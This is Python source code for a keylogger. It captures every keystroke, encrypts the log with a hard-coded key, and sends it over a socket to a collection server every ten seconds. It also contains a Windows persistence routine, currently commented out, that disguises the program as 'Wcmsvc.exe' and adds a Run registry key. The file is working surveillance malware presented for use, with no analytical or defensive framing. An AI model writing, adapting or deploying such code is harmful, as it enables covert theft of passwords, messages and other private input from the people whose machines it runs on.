import keyboard
from threading import Timer
from datetime import datetime
from socket import *
from cryptography.fernet import Fernet
import os

SERVER = 'localhost'
PORT = 8888
LOG_INTERVAL = 10 # seconds
KEY = b'_AOWbfP5NT6qUsssqqnIEas54V2_XuwzJDJeRwTQORQ='

class Keylogger:
    def __init__(self, interval, fernet):
        self.interval = interval
        self.fernet = fernet
        self.log = ""

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report(self):
        if self.log:
            try:
                self.send_log()
            except:
                print("[*] cannot establish connection")
        
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def send_log(self):
        clientSocket = socket(AF_INET, SOCK_STREAM)
        clientSocket.connect((SERVER, PORT))

        print(self.log)

        encMessage = self.fernet.encrypt((self.log).encode())
        clientSocket.send(encMessage)

        print("[+] log sent")
        clientSocket.close()

    def setWinRegKey(self):
        check = subprocess.Popen("REG query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Wcmsvc", shell=True, stdout=subprocess.PIPE)
        subprocess_return = check.stdout.read()
    
        if "REG_SZ" not in str(subprocess_return):
            for root, dirs, files in os.walk("C:\\"):
                if "Wcmsvc.exe" in files:
                    full_path = os.path.join(root, "Wcmsvc.exe")
                    break
        
            os.rename(full_path, os.getenv('APPDATA')+'\\Wcmsvc.exe')
        
            subprocess.run('cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Wcmsvc /d "'+os.getenv('APPDATA')+'\\Wcmsvc.exe'+'""')

    def start(self):
        try:
            #self.setWinRegKey()
            keyboard.on_release(callback=self.callback)
            self.report()
            keyboard.wait()
        except KeyboardInterrupt:
            print("[-] stopping")

if __name__ == "__main__":
    keylogger = Keylogger(interval=LOG_INTERVAL, fernet=Fernet(KEY))
    print("[+] starting")
    keylogger.start()
